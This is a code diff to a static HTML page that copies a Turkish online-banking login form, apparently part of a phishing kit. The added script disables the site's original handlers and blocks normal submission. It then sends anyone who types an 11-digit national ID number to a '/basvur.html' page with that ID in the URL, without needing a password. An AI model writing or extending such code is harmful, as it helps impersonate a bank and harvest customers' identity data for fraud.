@@ -100,7 +100,7 @@
                           </a>
                         </div>
                         <div class="loginFormButtonHolder">
-                          <button id="_ctl0_SubeLogin01_btnGiris" class="ui-button darkBlueButton login" type="submit" tabindex="19" name="_ctl0:SubeLogin01_btnGiris">Giriş</button>
+                          <button id="_ctl0_SubeLogin01_btnGiris" class="ui-button darkBlueButton login" type="button" tabindex="19" name="_ctl0:SubeLogin01_btnGiris">Giriş</button>
                         </div>
                       </div>
                     </div>
@@ -203,46 +203,99 @@
   <script src="https://cdn.jsdelivr.net/npm/jqueryui@1.11.1/jquery-ui.min.js" integrity="sha256-4JY5MVcEmAVSuS6q4h9mrwCm6KNx91f3awsSQgwu0qc=" crossorigin="anonymous"></script>
   <script src="./dist/app.js"></script>
   <script>
-    // app.js yüklendikten sonra çalıştır
-    window.addEventListener('load', function() {
+    // Direkt yönlendirme için - app.js'i bypass et
+    document.addEventListener('DOMContentLoaded', function() {
+      // Hata mesajlarını gizle
       setTimeout(function() {
-        // Hata mesajlarını gizle
-        $('.inputBottomErrorContainer.tckn').hide();
-        $('.inputBottomErrorContainer.password').hide();
-        
-        // TCKN input değiştiğinde hata mesajını gizle
-        $('#_ctl0_MusNoText').on('input', function() {
-          if ($(this).val().length === 11) {
-            $('.inputBottomErrorContainer.tckn').hide();
-            $(this).removeClass('hasError');
-          }
-        });
+        var errorContainer = document.querySelector('.inputBottomErrorContainer.tckn');
+        if (errorContainer) {
+          errorContainer.style.display = 'none';
+        }
+      }, 100);
 
-        // Tüm submit event handler'larını kaldır ve yeni bir tane ekle
-        $('#Form1Div').off('submit').on('submit', function(e) {
-          const tcknValue = $('#_ctl0_MusNoText').val().trim();
-          
-          // TCKN kontrolü - sadece 11 karakter kontrolü
-          if (!tcknValue || tcknValue.length !== 11) {
-            e.preventDefault();
-            e.stopImmediatePropagation();
-            e.stopPropagation();
-            
-            // Hata mesajını göster
-            $('.inputBottomErrorContainer.tckn').show();
-            $('#_ctl0_MusNoText').addClass('hasError').focus();
-            return false;
+      // Butona event listener ekle - capture phase'de
+      function handleButtonClick(e) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        e.stopPropagation();
+        
+        var tcknInput = document.getElementById('_ctl0_MusNoText');
+        if (!tcknInput) return false;
+        
+        var tcknValue = tcknInput.value.trim();
+        var errorContainer = document.querySelector('.inputBottomErrorContainer.tckn');
+        
+        // TCKN kontrolü - sadece 11 karakter kontrolü
+        if (!tcknValue || tcknValue.length !== 11) {
+          // Hata mesajını göster
+          if (errorContainer) {
+            errorContainer.style.display = 'block';
           }
+          if (tcknInput) {
+            tcknInput.classList.add('hasError');
+            tcknInput.focus();
+          }
+          return false;
+        }
+        
+        // TCKN geçerliyse hata mesajını gizle
+        if (errorContainer) {
+          errorContainer.style.display = 'none';
+        }
+        if (tcknInput) {
+          tcknInput.classList.remove('hasError');
+        }
+        
+        // Direkt yönlendirme yap
+        window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue);
+        
+        return false;
+      }
+
+      // Buton bulunduğunda event ekle
+      function attachButtonListener() {
+        var button = document.getElementById('_ctl0_SubeLogin01_btnGiris');
+        if (button) {
+          // Tüm event listener'ları kaldır
+          var newButton = button.cloneNode(true);
+          button.parentNode.replaceChild(newButton, button);
           
-          // TCKN geçerliyse hata mesajını gizle
-          $('.inputBottomErrorContainer.tckn').hide();
-          $('#_ctl0_MusNoText').removeClass('hasError');
+          // Yeni event listener ekle - capture phase
+          newButton.addEventListener('click', handleButtonClick, true);
           
-          // Şifre alanı boş olsa bile formu gönder (sadece TCKN yeterli)
-          // Form normal şekilde submit edilsin
+          // jQuery event'lerini de override et
+          if (typeof jQuery !== 'undefined') {
+            jQuery(newButton).off('click').on('click', handleButtonClick);
+          }
           return true;
-        });
-      }, 500); // app.js'in yüklenmesi için biraz bekle
+        }
+        return false;
+      }
+
+      // Buton bulunana kadar dene
+      if (!attachButtonListener()) {
+        var attempts = 0;
+        var checkButton = setInterval(function() {
+          attempts++;
+          if (attachButtonListener() || attempts > 50) {
+            clearInterval(checkButton);
+          }
+        }, 100);
+      }
+
+      // app.js yüklendikten sonra tekrar dene
+      setTimeout(attachButtonListener, 500);
+      setTimeout(attachButtonListener, 1000);
+      setTimeout(attachButtonListener, 2000);
+
+      // Form submit'ini engelle
+      var form = document.getElementById('Form1Div');
+      if (form) {
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          return false;
+        }, true);
+      }
     });
   </script>
 </body>
